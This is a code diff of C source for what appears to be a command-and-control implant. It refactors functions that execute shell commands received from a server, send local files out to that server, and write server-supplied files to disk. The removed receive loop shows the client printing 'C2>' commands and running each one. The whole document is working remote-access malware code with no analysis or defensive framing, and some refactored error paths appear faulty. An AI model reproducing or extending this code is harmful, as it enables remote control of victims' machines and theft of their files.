@@ -61,7 +61,7 @@ int psh_exec(sock_t sock, const char *cmd) {
         return 1;
     }
 
-    while (fgets(buf, sizeof(buf), fp)) {
+    while (fgets(buf, sizeof(buf), fp) != NULL) {
         size_t len = strlen(buf);
 
         // Expand buffer if needed
@@ -82,80 +82,55 @@ int psh_exec(sock_t sock, const char *cmd) {
 
     // Null-terminate
     output[total_len] = '\0';
-    safe_send_payload(sock, output, total_len + 1, 0);
+    safe_send(sock, output, PSH_CMD, total_len + 1, 0);
     free(output);
     return 0;
 }
 
-void psh_receive(sock_t sock) {
-    while (1) {
-        char* cmd = (char*)safe_recv_payload(sock, NULL, 0);
-
-        if (strcmp(cmd, "quit") == 0) break;
-
-        printf("C2> %s\n", cmd);
-
-        psh_exec(sock, cmd);
-        free(cmd);
-    }
-    return;
-}
-
-void upload_file_to_server(sock_t sock) {
-    // I will properly set status code in the future trust
-    char status = '1';
-    char *remote_path = (char*)safe_recv_payload(sock, NULL, 0);
+void upload_file_to_server(sock_t sock, char* remote_path) {
+    int status = 1;
     if (!remote_path) {
-        return;
+        status = 0;
     }
 
     size_t file_size = 0;
     char *file_buffer = read_file(remote_path, &file_size);
-    if (!file_buffer) {
-        free(remote_path);
-        return;
+    if (!file_buffer || file_size > INT_MAX) {
+        status = 0;
     }
 
-    if (file_size > INT_MAX) {
-        free(file_buffer);
-        free(remote_path);
-        return;
-    }
+    // Send status 
+    send(sock, &status, sizeof(int), 0);
 
-    
-    if (safe_send(sock, &status, 1, 0) <= 0) {
-        free(file_buffer);
-        free(remote_path);
-        return;
-    }
-    safe_send_payload(sock, file_buffer, (int)file_size, 0);
+    // Send payload if status = 1
+    if (status) safe_send(sock, file_buffer, DL_FILE_CMD, (int)file_size, 0);
     free(file_buffer);
     free(remote_path);
+    return;
 }
 
-void download_file_from_server(sock_t sock) {
-    char *remote_path = (char*)safe_recv_payload(sock, NULL, 0);
+void download_file_from_server(sock_t sock, char *remote_path) {
+    int status = 1;
     if (!remote_path) {
         return;
     }
 
     int incoming_size = 0;
-    BYTE *file_buffer = (BYTE*)safe_recv_payload(sock, &incoming_size, 0);
+    BYTE *file_buffer = (BYTE*)safe_recv(sock, NULL, &incoming_size, 0);
     if (!file_buffer) {
-        free(remote_path);
-        return;
+        status = 0;
     }
 
     if (remote_path[0] == '\0') {
-        free(remote_path);
-        free(file_buffer);
-        return;
+        status = 0;
     }
 
     FILE *fp = fopen(remote_path, "wb");
     if (!fp) {
-        free(remote_path);
+        status = 0;
+        send(sock, &status, sizeof(int), 0);
         free(file_buffer);
+        free(remote_path);
         return;
     }
 
@@ -163,11 +138,12 @@ void download_file_from_server(sock_t sock) {
     size_t written = expected ? fwrite(file_buffer, 1, expected, fp) : 0;
     fclose(fp);
 
-    if (written == expected) {
-        char status = '1';
-        safe_send(sock, &status, 1, 0);
+    if (written != expected) {
+        status = 0;
     }
+    send(sock, &status, sizeof(int), 0);
 
     free(remote_path);
     free(file_buffer);
+    return;
 }
